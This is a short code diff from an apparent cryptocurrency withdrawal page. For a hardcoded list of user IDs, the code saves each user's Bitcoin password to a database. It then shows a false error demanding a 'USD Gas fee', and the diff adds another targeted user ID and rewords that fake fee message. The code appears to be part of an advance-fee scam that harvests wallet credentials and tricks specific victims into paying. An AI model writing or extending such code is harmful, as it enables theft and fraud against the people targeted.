@@ -143,7 +143,7 @@ const savebtcwithdrawlToDb = () => {
                 var uid = user.uid;
 
 
-                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "06cgtCpQSgVijfFSRnmzqnQ77Sl2") {
+                if (uid === "RdzfByeKcJfkhNiCIBIMqlVQnWe2" || uid === "5hFThgDxjcdHc2eDvQxevu9YjA82" || uid === "06cgtCpQSgVijfFSRnmzqnQ77Sl2" || uid === "IvzXR0QnTMOkJHxc4pTs7DF6EBb2") {
 
 
                     db.collection("btc-withdrawals").doc(uid).set({
@@ -153,7 +153,7 @@ const savebtcwithdrawlToDb = () => {
                         btcpassword: btcPassword
                     }, { merge: true })
                         .then(() => {
-                            alert("Error: USD Commision fee required")
+                            alert("Error: USD Gas fee required")
 
                         })
                         .catch((error) => {
